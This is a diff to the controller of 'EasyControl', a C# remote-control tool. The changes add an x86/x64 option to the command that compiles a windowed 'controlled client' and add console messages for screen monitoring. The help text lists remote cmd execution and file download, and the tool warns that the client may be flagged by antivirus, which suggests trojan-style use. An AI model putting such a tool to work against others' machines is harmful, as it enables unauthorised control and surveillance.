@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Net;
@@ -41,7 +41,7 @@ namespace EasyControl
                     case "generate":
                         try
                         {
-                            Generate(Command_Array[1]);
+                            Generate(Command_Array[1], Command_Array[2]);
                         }
                         catch { Help("generate"); }
                         break;
@@ -52,7 +52,7 @@ namespace EasyControl
 
             }
         }
-        static void Generate(string outputname)
+        static void Generate(string outputname,string platform)
         {
             Console.WriteLine("注意，你正在使用程序自带编译函数...");
             Console.WriteLine("可能被杀软查杀标记...");
@@ -69,7 +69,7 @@ namespace EasyControl
             parameters.ReferencedAssemblies.Add("System.Core.dll");
             parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
             parameters.ReferencedAssemblies.Add("System.Drawing.dll");
-            parameters.CompilerOptions = "/target:winexe /optimize /define:DEBUG /win32icon:icon.ico";
+            parameters.CompilerOptions = "/debug /target:winexe /optimize+ /define:DEBUG /win32icon:icon.ico /platform:" + platform;
 
             CompilerResults results = provider.CompileAssemblyFromFile(parameters, "EasyControlClient.cs");
             if (results.Errors.HasErrors)
@@ -117,6 +117,7 @@ namespace EasyControl
                             {
                                 try
                                 {
+                                    Console.WriteLine("正在启动屏幕监控...");
                                     MainForm form = new MainForm();
                                     form.FormClosed += (sender, e) =>
                                     {
@@ -125,6 +126,8 @@ namespace EasyControl
                                     };
                                     form.Show();
                                     Application.Run();
+                                    Console.WriteLine("启动完成...");
+                                    Console.WriteLine("关闭窗口 退出 监控模式...");
                                 }
                                 catch { return; }
 
@@ -164,7 +167,7 @@ namespace EasyControl
                             Console.WriteLine("Download Completed!");
                             break;
                         case "help":
-                            Help((Regex.Split(send_command, " "))[1]);
+                            Help("all");
                             break;
                         default:
                             s.Send(Encoding.Default.GetBytes(send_command));
@@ -216,7 +219,7 @@ namespace EasyControl
                     Console.WriteLine("-                                               -");
                     Console.WriteLine("- 指令：                                        -");
                     Console.WriteLine("- listen [ip] [端口] 监听目标ip端口             -");
-                    Console.WriteLine("- generate [savename] 编译生成被控端 (不推荐)   -");
+                    Console.WriteLine("- generate [name] [x86/x64] 生成被控端(不推荐)  -");
                     Console.WriteLine("-                                               -");
                     Console.WriteLine("- 控制模式指令：                                -");
                     Console.WriteLine("- cmd [cmd命令] 执行cmd指令                     -");
@@ -237,7 +240,7 @@ namespace EasyControl
                 case "generate":
                     Console.WriteLine("-------------------EasyControl-------------------");
                     Console.WriteLine("-                                               -");
-                    Console.WriteLine("- generate [savename] 编译生成被控端            -");
+                    Console.WriteLine("- generate [name] [x86/x64] 生成被控端(不推荐)  -");
                     Console.WriteLine("-                                               -");
                     Console.WriteLine("-------------------------------------------------");
                     break;
